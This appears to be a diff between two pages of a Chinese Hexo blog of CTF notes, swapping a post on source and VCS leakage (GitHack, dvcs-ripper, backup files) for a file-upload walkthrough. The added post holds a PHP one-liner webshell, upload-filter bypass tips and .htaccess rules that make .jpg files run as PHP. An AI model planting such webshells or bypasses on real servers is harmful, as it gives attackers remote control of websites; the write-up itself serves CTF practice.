@@ -6,19 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>信息泄露 | Hexo</title>
+  <title>文件上传-2 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="信息泄露dirmap python3 dirmap.py -i http:&#x2F;&#x2F;challenge-094d91d84a667375.sandbox.ctfhub.com:10800&#x2F; -lcf">
+  <meta name="description" content="文件上传2">
 <meta property="og:type" content="article">
-<meta property="og:title" content="信息泄露">
-<meta property="og:url" content="http://example.com/2022/04/27/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/index.html">
+<meta property="og:title" content="文件上传-2">
+<meta property="og:url" content="http://example.com/2022/10/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-2/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="信息泄露dirmap python3 dirmap.py -i http:&#x2F;&#x2F;challenge-094d91d84a667375.sandbox.ctfhub.com:10800&#x2F; -lcf">
+<meta property="og:description" content="文件上传2">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2022-04-27T08:00:53.000Z">
-<meta property="article:modified_time" content="2022-05-16T12:41:08.341Z">
+<meta property="article:published_time" content="2022-10-25T13:46:10.000Z">
+<meta property="article:modified_time" content="2022-10-25T13:46:50.313Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="文件上传">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
@@ -151,138 +151,69 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-信息泄露" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-文件上传-2" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      信息泄露
+      文件上传-2
     </h1>
   
 
         
-        <a href="/2022/04/27/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="archive-article-date">
-  	<time datetime="2022-04-27T08:00:53.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-04-27</time>
+        <a href="/2022/10/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-2/" class="archive-article-date">
+  	<time datetime="2022-10-25T13:46:10.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-10-25</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h1><h3 id="dirmap"><a href="#dirmap" class="headerlink" title="dirmap"></a>dirmap</h3><ol>
-<li><p>python3 dirmap.py -i <a target="_blank" rel="noopener" href="http://challenge-094d91d84a667375.sandbox.ctfhub.com:10800/">http://challenge-094d91d84a667375.sandbox.ctfhub.com:10800/</a> -lcf</p>
-<span id="more"></span></li>
+        <h1 id="文件上传2"><a href="#文件上传2" class="headerlink" title="文件上传2"></a>文件上传2</h1><?php echo @eval($_POST['shell']);?>
+
+<span id="more"></span>
+
+<h3 id="copy-from-小西"><a href="#copy-from-小西" class="headerlink" title="copy from 小西"></a>copy from 小西</h3><p>简单的上传文件，查看响应</p>
+<p>是否只是前端过滤后缀名，文件格式，</p>
+<p>抓包绕过</p>
+<p>是否存在截断上传漏洞</p>
+<p>是否对文件头检测，（图片马等等）</p>
+<p>是否对内容进行了检测，尝试绕过方法</p>
+<p>是否上传马被查杀，免杀</p>
+<p>是否存在各种解析漏洞</p>
+<p>http 头以两个CRLF (相当于\r\n\r\n)作为结尾，\r\n码没有被过滤时，可以利用\r\n\r\n作为url参数截断http</p>
+<p>头，后面跟上注入代码</p>
+<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，也可以将其称做为一种网页后门。</p>
+<h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><p>简称Webshell，到目前web服务目录继而提权获取系统权限，不论asp、php、jsp、aspx都是如此</p>
+<p>利用文件上传漏洞，往目标网站中上传一句话木马，然后你就可以在本地通过蚁剑即可获取和控制整个网站目录。</p>
+<p>@表示后面即使执行错误，也不报错。</p>
+<p>eval（）函数表示括号内的语句字符串什么的全都当做代码执行。</p>
+<p>$_POST[‘attack’]表示从页面中获得attack这个参数值。</p>
+<h3 id="htaccess"><a href="#htaccess" class="headerlink" title="htaccess"></a>htaccess</h3><p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
+<h3 id="buuctf-MRCTF2020-你传你🐎呢"><a href="#buuctf-MRCTF2020-你传你🐎呢" class="headerlink" title="buuctf [MRCTF2020]你传你🐎呢"></a>buuctf [MRCTF2020]你传你🐎呢</h3><ol>
+<li>随便传一个1.jpg</li>
 </ol>
-<h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><h4 id="log"><a href="#log" class="headerlink" title="log"></a>log</h4><ol>
-<li><p>打开githack目录，终端python2 GitHack.py <a target="_blank" rel="noopener" href="http://challenge-8647dd621625e82e.sandbox.ctfhub.com:10800/.git/">http://challenge-8647dd621625e82e.sandbox.ctfhub.com:10800/.git/</a></p>
-</li>
-<li><p>cd disk</p>
-</li>
-<li><p>cd challenge-8647dd621625e82e.sandbox.ctfhub.com_10800</p>
-</li>
-<li><p>git log</p>
-</li>
-<li><p>git diff (第一串数字)  (第二串数字)</p>
-</li>
-<li><p>flag</p>
-</li>
+<p>&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;4642c69319e283b160cbe449ddaf1a17&#x2F;1.jpg succesfully uploaded!</p>
+<ol start="2">
+<li>.htaccess文件</li>
 </ol>
-<h4 id="stash"><a href="#stash" class="headerlink" title="stash"></a>stash</h4><ol>
-<li><p>打开githack目录，终端python2 GitHack.py <a target="_blank" rel="noopener" href="http://challenge-56e026eba6aecc8f.sandbox.ctfhub.com:10800/.git/">http://challenge-56e026eba6aecc8f.sandbox.ctfhub.com:10800/.git/</a></p>
-</li>
-<li><p>cd disk</p>
-</li>
-<li><p>cd challenge-8647dd621625e82e.sandbox.ctfhub.com_10800</p>
-</li>
-<li><p>git log</p>
-</li>
-<li><p>git diff 无用  用git stash list(列出Git栈内的所有备份，可以利用这个列表来决定从那个地方恢复。)</p>
-</li>
-<li><p>git stash pop (从Git栈中读取最近一次保存的内容，恢复工作区的相关内容。由于可能存在多个Stash的内容，所以用栈来管理，pop会从最近的一个stash中读取内容并恢复。)</p>
-</li>
-<li><p>ls -a 4451371511408.txt</p>
-</li>
-<li><p>cat 4451371511408.txt</p>
-</li>
-<li><p>flag</p>
-</li>
+<p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。新建.htaccess文件，编辑内容为SetHandler application&#x2F;x-httpd-php<br>&#x2F;&#x2F;该语句作用是让Apache将其他类型文件均以php格式解析</p>
+<ol start="3">
+<li>抓包</li>
 </ol>
-<h4 id="index"><a href="#index" class="headerlink" title="index"></a>index</h4><p>和log一样</p>
-<h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h3><p>找</p>
-<h3 id="svn文件泄露"><a href="#svn文件泄露" class="headerlink" title="svn文件泄露"></a>svn文件泄露</h3><ol>
-<li>.&#x2F;rip-svn.pl -u <a target="_blank" rel="noopener" href="http://challenge-b653f81a57122a49.sandbox.ctfhub.com:10800/.svn/">http://challenge-b653f81a57122a49.sandbox.ctfhub.com:10800/.svn/</a></li>
-<li>ls -al</li>
-<li>cd .svn</li>
-<li>ls -al</li>
-<li>cat wc.db | grep flag       (???干啥的)</li>
-<li>cd pristine&#x2F;</li>
-<li>ls</li>
-<li>cat bf45c36a4dfb73378247a6311eac4f80f48fcb92.svn-base</li>
-<li>cd ..</li>
-<li>ls</li>
-<li>cd 90</li>
-<li>ls</li>
-<li>cat 90df95644d850243705c025fb50e5b051ba46346.svn-base</li>
-<li>ctfhub{c01b72bf2cfdd9e8a900ff3c}</li>
+<p>要改filename&#x3D;.htaccess  加一句话：AddType application&#x2F;x-httpd-php.jpg</p>
+<p>返回：<strong>Warning</strong>:  mkdir(): File exists in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;upload.php</strong> on line <strong>23</strong><br> &#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;4642c69319e283b160cbe449ddaf1a17&#x2F;.htaccess succesfully uploaded!</p>
+<ol start="4">
+<li>重新上传一个htaccess文件 写入SetHandler application&#x2F;x-httpd-php</li>
+<li>抓包，改filename&#x3D;.htaccess content-type&#x3D;image&#x2F;jpeg</li>
+<li>网页返回&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;4642c69319e283b160cbe449ddaf1a17&#x2F;.htaccess</li>
+<li>再上传1.jpg</li>
+<li>得<strong>Warning</strong>:  mkdir(): File exists in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;upload.php</strong> on line <strong>23</strong><br> &#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;4642c69319e283b160cbe449ddaf1a17&#x2F;1.jpg succesfully uploaded!</li>
+<li>蚁剑：<a target="_blank" rel="noopener" href="http://524f0bfe-e1c8-4092-a336-07ada68adb99.node4.buuoj.cn:81/upload/4642c69319e283b160cbe449ddaf1a17/1.jpg">http://524f0bfe-e1c8-4092-a336-07ada68adb99.node4.buuoj.cn:81/upload/4642c69319e283b160cbe449ddaf1a17/1.jpg</a></li>
+<li>根目录 flag{3cffd78f-39bb-40e6-abd4-3a767cb54568}</li>
 </ol>
-<h3 id="HG文件泄露-dvcs-ripper"><a href="#HG文件泄露-dvcs-ripper" class="headerlink" title="HG文件泄露   dvcs-ripper"></a>HG文件泄露   dvcs-ripper</h3><ol>
-<li><p>.&#x2F;rip-hg.pl -v -u <a target="_blank" rel="noopener" href="http://challenge-b294f6ce9e606d41.sandbox.ctfhub.com:10800/.hg/">http://challenge-b294f6ce9e606d41.sandbox.ctfhub.com:10800/.hg/</a></p>
-</li>
-<li><p>ls -al</p>
-</li>
-<li><p>cd .hg</p>
-</li>
-<li><p>ls -al</p>
-</li>
-<li><p>cd store&#x2F;</p>
-</li>
-<li><p>ls</p>
-</li>
-<li><p>cat fncache</p>
-</li>
-<li><p>curl <a target="_blank" rel="noopener" href="http://challenge-b294f6ce9e606d41.sandbox.ctfhub.com:10800/flag_2900613527.txt">http://challenge-b294f6ce9e606d41.sandbox.ctfhub.com:10800/flag_2900613527.txt</a></p>
-</li>
-</ol>
-<h3 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h3><h4 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h4><h5 id="常见的网站源码备份文件后缀"><a href="#常见的网站源码备份文件后缀" class="headerlink" title="常见的网站源码备份文件后缀"></a>常见的网站源码备份文件后缀</h5><hr>
-<ul>
-<li>tar</li>
-<li>tar.gz</li>
-<li>zip</li>
-<li>rar</li>
-</ul>
-<h5 id="常见的网站源码备份文件名"><a href="#常见的网站源码备份文件名" class="headerlink" title="常见的网站源码备份文件名"></a>常见的网站源码备份文件名</h5><hr>
-<ul>
-<li>web</li>
-<li>website</li>
-<li>backup</li>
-<li>back</li>
-<li>www</li>
-<li>wwwroot</li>
-<li>temp</li>
-</ul>
-<ol>
-<li>先用dirmap扫描</li>
-<li>output中发现<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></li>
-<li>网页中打开<a target="_blank" rel="noopener" href="http://challenge-b26af60f9f98efeb.sandbox.ctfhub.com:10800/www.zip">http://challenge-b26af60f9f98efeb.sandbox.ctfhub.com:10800/www.zip</a></li>
-<li>下载<a target="_blank" rel="noopener" href="http://www.zip,内有flag_3069431669.txt/">www.zip,内有flag_3069431669.txt</a></li>
-<li>打开<a target="_blank" rel="noopener" href="http://challenge-b26af60f9f98efeb.sandbox.ctfhub.com:10800/flag_3069431669.txt">http://challenge-b26af60f9f98efeb.sandbox.ctfhub.com:10800/flag_3069431669.txt</a></li>
-<li>ctfhub{9397cd3fa865a8ebaad7ef14}</li>
-</ol>
-<h4 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h4><ol>
-<li><a target="_blank" rel="noopener" href="http://challenge-094d91d84a667375.sandbox.ctfhub.com:10800/index.php.bak">http://challenge-094d91d84a667375.sandbox.ctfhub.com:10800/index.php.bak</a></li>
-<li>下载index.php.bak</li>
-<li>记事本打开</li>
-<li>flag</li>
-</ol>
-<h4 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h4><ol>
-<li><a target="_blank" rel="noopener" href="http://challenge-094d91d84a667375.sandbox.ctfhub.com:10800/.DS_Store">http://challenge-094d91d84a667375.sandbox.ctfhub.com:10800/.DS_Store</a></li>
-<li>下载</li>
-<li>打开记事本中的文件</li>
-<li>flag</li>
-</ol>
-<hr>
 
       
 
@@ -317,7 +248,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">文件上传</a>
         		</li>
       		
 		</ul>
@@ -373,7 +304,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/04/27/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/10/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-2/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -387,18 +318,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2022/05/11/SQL-inject/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          SQL注入
-        
-      </div>
-    </a>
   
-  
-    <a href="/2022/04/09/%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">过滤绕过</div>
+    <a href="/2022/09/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">命令执行</div>
       <i class="icon-circle-right"></i>
     </a>
   
